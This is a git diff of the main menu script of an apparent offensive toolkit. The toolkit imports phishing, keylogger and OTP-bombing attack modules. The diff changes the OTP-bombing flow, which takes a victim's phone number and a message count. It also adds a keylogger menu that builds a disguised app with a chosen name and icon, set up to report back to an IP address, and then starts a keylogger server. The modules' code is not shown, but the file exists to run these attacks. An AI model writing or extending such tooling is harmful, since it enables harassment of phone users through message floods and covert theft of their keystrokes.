@@ -29,6 +29,7 @@ from includes import utils
 from includes.menu import main_menu
 from includes import config_status
 from AttackModes import phishing
+from AttackModes import keylogger
 from AttackModes import otpboming
 from rich.console import Console
 from rich.panel import Panel
@@ -66,17 +67,36 @@ def main():
         elif choice == 2:
             banner.clear
             banner.show_banner()
-            country_code, mobile_no, otpcount = otpboming.sendotp()
-            banner.clear
-            banner.show_banner()
-            otpboming.attack(country_code, mobile_no, otpcount)
-            time.sleep(10)
-
-
-
-
             
-           
+            result = otpboming.getio()
+            if result:
+                country_code, mobile_no, otpcount = result
+                banner.clear
+                banner.show_banner()
+                otpboming.sendotp(country_code, mobile_no, otpcount)
+            else:
+                print("🔙 Returning to main menu...")
+
+        elif choice == 3:
+             banner.clear
+             banner.show_banner()
+             selected = keylogger.user_option()
+             if selected == '1':
+                banner.clear
+                banner.show_banner()
+                result =keylogger.getio()
+                if result:
+                    os_type, ip_address, app_name, icon_url = result
+                    keylogger.compile_app(os_type, ip_address, app_name, icon_url)
+                    
+                else:
+                    print("❌ User exited.")
+             elif selected == '2':
+                keylogger.start_keylogger_server()
+             elif selected == 'x':
+                print("Exiting...")
+             
+
         else:
             banner.not_implemented()
 
